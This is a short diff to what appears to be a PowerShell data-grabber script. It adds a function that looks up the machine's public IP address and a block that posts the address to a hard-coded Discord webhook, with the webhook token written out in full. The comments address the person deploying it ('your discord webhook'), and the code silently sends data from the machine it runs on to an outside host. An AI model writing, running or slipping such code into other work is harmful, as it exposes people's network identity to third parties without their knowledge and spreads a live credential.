@@ -1,3 +1,22 @@
+function Get-IPAddress {
+    $IPAddress = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+    return $IPAddress
+}
+
+# This assigns your discord webhook to a variable to make it easier to refer to
+$WebhookURL = "https://discord.com/api/webhooks/1116817887349440522/3jS6qCFEZBVZwSvkMaoh5gHdn76_M0AQyhHqx5FlRHFyjEpLQ0hCvhN7jDB5R1f7IYfA"
+
+# This converts the function into a variable
+$IPAddress = Get-IPAddress
+
+# This makes a variable that is compatible with the discord URL process
+$Payload = @{
+    "content" = "Machine IP Address: $IPAddress"
+} | ConvertTo-Json
+
+# This sends the IP adress to your webhook.
+Invoke-RestMethod -Uri $WebhookURL -Method POST -ContentType "application/json" -Body $Payload
+
 function Get-fullName {
 
     try {
